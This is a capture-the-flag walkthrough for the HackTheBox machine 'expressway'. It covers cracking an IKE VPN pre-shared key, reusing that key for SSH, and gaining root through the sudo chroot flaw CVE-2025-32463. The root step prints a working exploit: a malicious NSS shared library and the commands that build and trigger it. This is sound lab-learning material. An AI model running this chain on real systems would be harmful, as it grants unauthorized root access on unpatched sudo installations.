# expressway (HTB) – full walkthrough

**Target:** `10.10.11.87`  
**Attacker:** `Kali`  
**Goal:** `user` + `root`

> ⚠️ For educational/CTF use.

---

## 0) Quick prep (optional but handy)

Add the host to your `/etc/hosts` so the domain that leaks later makes sense:

```bash
echo "10.10.11.87 expressway.htb" | sudo tee -a /etc/hosts
```

## 1) Recon – find the interesting service

We already know this is about IKE (UDP/500):

```bash
nmap -sU -p 500 -A 10.10.11.87
```

Result: UDP/500 open, IKEv1, Aggressive Mode traits and XAUTH + Dead Peer Detection. That’s the classic “grab the Aggressive Mode handshake and crack the PSK” situation.

## 2) Capture an IKE Aggressive Mode handshake

```bash
ike-scan -P -M -A -n fakeID 10.10.11.87
```

-A Aggressive mode

-n fakeID supplies a dummy ID to trigger a response

-M multiline dump

-P prints crackable fields (you’ll copy them next)
## What to save: the long colon-separated line after “IKE PSK parameters”. Put it in a file:
```bash
# paste the long "g_xr:...:hash_r" line into psk.txt
nano psk.txt
```

## 3) 3) Crack the PSK

Dictionary crack against RockYou:

```bash
psk-crack --dictionary /usr/share/wordlists/rockyou.txt psk.txt
```
You hit: fre****************

Verify the PSK works:

```bash
ike-scan -A -n ike@expressway.htb --psk=fre**************** 10.10.11.87
```
You should see another Aggressive Mode handshake returned.

## 4) Extra enum – TFTP config (optional but confirms clues)

A TFTP service exposes a router config that reinforces the ike user/realm:

```bash
nmap -sU -p 69 --script tftp-enum 10.10.11.87
# shows ciscortr.cfg
tftp 10.10.11.87 -c get ciscortr.cfg
cat ciscortr.cfg
```

You saw ciscortr.cfg via NSE. Contents typically hint at the same domain/user and VPN bits.

## 5) Foothold – SSH reuse of the PSK

Try the leaked identity as a system user with the same password (common HTB trick on this box):

```bash
ssh ike@10.10.11.87
# password:
#   fre****************
cat ~/user.txt
***********************************
```

## 6) Privilege escalation – vulnerable SUID sudo (“chwoot”)

On the host:

```bash
ls -l /usr/local/bin/sudo
/usr/local/bin/sudo -V | head -n1
```


box:

SUID root: /usr/local/bin/sudo

Version: Sudo version 1.9.17

Sudo 1.9.14–1.9.17 has a critical local privesc dubbed “chwoot” (CVE-2025-32463). The bug is in the --chroot (-R) path: when you run sudo with a user-controlled root dir, it consults NSS config from that directory and can be steered to load a malicious NSS library as root, yielding an instant root shell. Fixed in 1.9.17p1.

There’s also a related host-check bug, CVE-2025-32462, where sudo -h <host> can bypass host-tied sudoers rules; it was also fixed in 1.9.17p1. We don’t need it here.

Exploit steps

```bash
STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX); cd "$STAGE"

// woot1337.c
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void){
    setreuid(0,0); setregid(0,0);
    chdir("/"); execl("/bin/bash","bash","-p",NULL);
}

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc   # prevents NSS from crashing
```

Build the shared object:

```bash
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

/usr/local/bin/sudo -R woot woot

cat /root/root.txt
***********************************
```

Why it works: vulnerable sudo (≤ 1.9.17) honors an attacker-controlled chroot and evaluates NSS from the fake root, loading /libnss_/woot1337.so.2 and executing its constructor as root. Patched in 1.9.17p1. Detections in the wild key off suspicious sudo -R usage with attacker-seeded nsswitch.conf.